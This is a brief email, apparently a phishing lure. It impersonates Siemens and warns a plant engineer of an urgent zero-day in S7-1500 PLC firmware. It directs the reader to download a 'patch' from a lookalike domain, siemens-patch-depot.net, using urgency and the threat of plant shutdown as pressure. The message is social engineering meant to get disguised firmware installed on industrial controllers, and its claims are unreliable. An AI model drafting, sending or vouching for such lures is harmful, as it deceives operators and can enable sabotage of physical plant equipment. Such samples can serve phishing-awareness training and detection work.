Dear Plant Engineer,

A critical zero-day vulnerability has been discovered in the Modbus TCP stack of Siemens S7-1500 PLCs. An emergency patch is required immediately to prevent physical plant shutdown.

Download and apply the firmware patch without delay: http://siemens-patch-depot.net/download/firmware_s7_v4.bin